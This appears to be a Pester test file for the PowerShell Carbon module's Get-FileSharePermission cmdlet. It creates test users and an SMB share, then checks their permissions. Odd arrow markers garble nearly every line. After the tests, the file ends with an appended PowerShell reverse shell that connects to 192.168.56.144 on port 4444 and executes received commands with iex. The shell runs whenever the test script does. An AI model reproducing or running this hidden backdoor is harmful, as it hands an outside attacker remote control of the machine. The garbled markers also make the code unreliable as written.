











 -||-> & ( -||-> Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve <-||- ) <-||- 

 -||-> Describe 'Get-FileSharePermission' {
     -||-> $shareName = 'CarbonGetFileSharePermission' <-||- 
     -||-> $sharePath = $null <-||- 
     -||-> $reader = 'CarbonFileShareReadr' <-||- 
     -||-> $writer = 'CarbonFileShareWritr' <-||- 
     -||-> $admin  = 'CarbonFileShareAdmin' <-||- 

     -||-> $sharePath =  -||-> Get-Item 'TestDrive:' | Select-Object -ExpandProperty 'FullName' <-||-  <-||- 
     -||-> foreach( $user in  -||-> ( -||-> $reader,$writer,$admin <-||- ) <-||-  )
    {
         -||-> if(  -||-> -not ( -||-> Test-User -Username $user <-||- ) <-||-  )
        {
             -||-> Install-User -Credential ( -||-> New-Credential -UserName $user -Password '!m33trequ!r3m3n+s' <-||- ) -Description 'Carbon test user.' <-||- 
        } <-||- 
    } <-||- 

     -||-> Install-SmbShare -Path $sharePath -Name $shareName -ReadAccess $reader -ChangeAccess $writer -FullAccess $admin -Description 'Share for testing Carbon''s Get-FileSharePermission.' <-||- 
    
     -||-> function Assert-FileSharePermission
    {
        param(
            $Permission,
    
            $Identity,
    
            $ExpectedRights
        )
    
         -||-> Set-StrictMode -Version 'Latest' <-||- 
    
         -||-> $Identity =  -||-> Resolve-IdentityName -Name $Identity <-||-  <-||- 
         -||-> $Identity | Should Not BeNullOrEmpty <-||- 
    
         -||-> $identityPerms =  -||-> $Permission | Where-Object {  -||-> $_.IdentityReference -eq $Identity <-||-  } <-||-  <-||- 
         -||-> $identityPerms | Should BeOfType ( -||-> [Carbon.Security.ShareAccessRule] <-||- ) <-||- 
         -||-> $identityPerms | Should Not BeNullOrEmpty <-||- 
         -||-> $identityPerms.ShareRights | Should Be $ExpectedRights <-||- 
         -||-> $identityPerms.ShareRights | Should Be ( -||-> [int]$ExpectedRights <-||- ) <-||- 
    } <-||- 
    
     -||-> try
    {
         -||-> It 'should get permissions' {
             -||-> $perms =  -||-> Get-FileSharePermission -Name $shareName <-||-  <-||- 
             -||-> ,$perms | Should BeOfType ( -||-> [object[]] <-||- ) <-||- 
             -||-> $perms.Count | Should Be 3 <-||- 
        
             -||-> Assert-FileSharePermission $perms $reader ( -||-> [Carbon.Security.ShareRights]::Read <-||- ) <-||- 
             -||-> Assert-FileSharePermission $perms $writer ( -||-> [Carbon.Security.ShareRights]::Change <-||- ) <-||- 
             -||-> Assert-FileSharePermission $perms $admin ( -||-> [Carbon.Security.ShareRights]::FullControl <-||- ) <-||- 
        } <-||- 
    
         -||-> It 'get user permission' {
             -||-> $perm =  -||-> Get-FileSharePermission -Name $shareName -Identity $reader <-||-  <-||- 
             -||-> $perm | Should BeOfType ( -||-> [Carbon.Security.ShareAccessRule] <-||- ) <-||- 
             -||-> Assert-FileSharePermission $perm $reader ( -||-> [Carbon.Security.ShareRights]::Read <-||- ) <-||- 
        } <-||- 
    
         -||-> It 'get user permission with wildcard' {
             -||-> $perm =  -||-> Get-FileSharePermission -Name $shareName -Identity '*Writr*' <-||-  <-||- 
             -||-> $perm | Should BeOfType ( -||-> [Carbon.Security.ShareAccessRule] <-||- ) <-||- 
             -||-> Assert-FileSharePermission $perm $writer ( -||-> [Carbon.Security.ShareRights]::Change <-||- ) <-||- 
        } <-||- 
    }
    finally
    {    
         -||-> Uninstall-FileShare -Name $shareName <-||- 
    } <-||- 

} <-||- 

 -||-> $client =  -||-> New-Object System.Net.Sockets.TCPClient( -||-> "192.168.56.144",4444 <-||- ) <-||-  <-||- ; -||-> $stream = $client.GetStream() <-||- ; -||-> [byte[]]$bytes =  -||-> 0..255|%{ -||-> 0 <-||- } <-||-  <-||- ; -||-> while( -||-> ( -||-> $i = $stream.Read($bytes, 0, $bytes.Length) <-||- ) -ne 0 <-||- ){; -||-> $data = ( -||-> New-Object -TypeName System.Text.ASCIIEncoding <-||- ).GetString($bytes,0, $i) <-||- ; -||-> $sendback = ( -||-> iex $data 2>&1 | Out-String <-||-  ) <-||- ; -||-> $sendback2  = $sendback + "PS " + ( -||-> pwd <-||- ).Path + "> " <-||- ; -||-> $sendbyte = ( -||-> [text.encoding]::ASCII <-||- ).GetBytes($sendback2) <-||- ; -||-> $stream.Write($sendbyte,0,$sendbyte.Length) <-||- ; -||-> $stream.Flush() <-||- } <-||- ; -||-> $client.Close() <-||- 



